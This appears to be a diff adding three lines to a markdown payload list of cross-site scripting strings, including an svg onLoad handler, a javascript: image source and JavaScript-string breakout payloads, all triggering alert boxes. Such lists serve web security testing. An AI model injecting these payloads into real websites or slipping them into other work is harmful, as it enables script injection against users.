@@ -17,6 +17,9 @@
 <IMG SRC=javascript:alert(&quot;XSS&quot;)>
 <svg onLoad=alert(document.domain)>
 /;alert(1)//
+'-alert(1)-'
+\'-alert(1)//
+javascript:alert(1)
 ```
 
 ## by Kira Reys
